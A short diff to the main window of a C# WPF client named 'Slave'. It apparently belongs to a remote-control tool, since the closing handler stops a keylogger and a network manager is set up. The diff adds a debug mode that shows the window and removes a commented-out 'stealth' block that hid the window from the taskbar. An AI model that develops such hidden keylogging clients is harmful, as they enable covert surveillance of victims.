@@ -2,6 +2,7 @@
 using Slave.Core;
 using System.Threading.Tasks;
 using System.Windows;
+using System.Windows.Media;
 
 namespace Slave
 {
@@ -15,6 +16,14 @@ namespace Slave
         public MainWindow()
         {
             InitializeComponent();
+
+            if (Config.debug)
+            {
+                // If debug, show window
+                this.ShowInTaskbar = true;
+                this.Visibility = Visibility.Visible;
+                this.Background = Brushes.Azure;
+            }
 
             manager = new SlaveManager();
             manager.networkManager = new SlaveNetworkManager();
@@ -36,11 +45,6 @@ namespace Slave
         void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
         {
             manager.commandsManager.StopKeylogger();
-
-            // stealth
-            /*e.Cancel = true;
-            this.ShowInTaskbar = false;
-            this.Visibility = Visibility.Hidden;*/
         }
     }
 }
